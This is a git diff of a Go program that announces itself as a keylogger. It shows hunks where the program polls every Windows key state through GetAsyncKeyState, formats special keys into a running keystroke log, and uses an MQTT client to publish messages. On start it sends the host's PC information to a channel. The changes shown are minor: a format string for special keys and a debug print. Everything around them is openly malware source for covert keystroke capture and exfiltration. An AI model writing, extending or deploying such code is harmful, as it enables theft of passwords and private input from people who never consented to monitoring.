@@ -27,7 +27,7 @@ var (
 
 	vClient     mqtt.Client
 	channel     string
-	keyBrackets string
+	keyBrackets string 		= "{%s}"
 )
 
 var vh mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
@@ -82,9 +82,9 @@ func keyLogger() {
 		time.Sleep(1 * time.Millisecond)
 		for KEY := 0; KEY <= 256; KEY++ {
 			time.Sleep(1 * time.Millisecond)
-			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
-			//fmt.Println(Val, val2, val3)
+			Val, val2, _ := procGetAsyncKeyState.Call(uintptr(KEY))
 			if int(Val) != 0 {
+				fmt.Println(int(Val),"; ", int(val2))
 				switch KEY {
 				case w32.VK_CONTROL:
 					tmpKeylog += fmt.Sprintf(keyBrackets, "Ctrl")
@@ -384,6 +384,7 @@ func subscribeChannel(topic string) mqtt.Token {
 func sendOnStart() {
 	sendMsg(channel, info.GetInfo().GetPcInfo(), 2, true)
 }
+
 
 func main() {
 	fmt.Println("Starting KeyLogger!")
